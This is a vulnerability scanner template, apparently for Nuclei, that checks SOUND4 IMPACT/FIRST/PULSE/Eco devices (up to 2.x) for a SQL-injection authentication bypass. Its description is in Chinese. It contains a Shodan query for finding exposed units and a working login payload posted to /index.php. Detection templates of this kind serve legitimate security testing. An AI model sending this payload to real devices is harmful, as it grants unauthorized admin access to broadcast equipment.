id: sound4-impact-auth-bypass

info:
  name: SOUND4 IMPACT/FIRST/PULSE/Eco <= 2.x - 认证绕过漏洞
  author: r3Y3r53
  severity: high
  description: SOUND4 IMPACT/FIRST/PULSE/Eco <= 2.x - 认证绕过 存在SQL 注入漏洞。攻击者可借助可控参数干预后端 SQL 查询，从而读取敏感数据、绕过鉴权或进一步影响数据库完整性。
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5727.php
  classification:
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:-1548359600
  tags: sqli,zeroscience,sound4,auth-bypass,vuln

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=%27%2Bjoxvy--%2Bz&password=ffesdf

    redirects: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "Network Diagnostic:", "disconnect the user")'
        condition: and
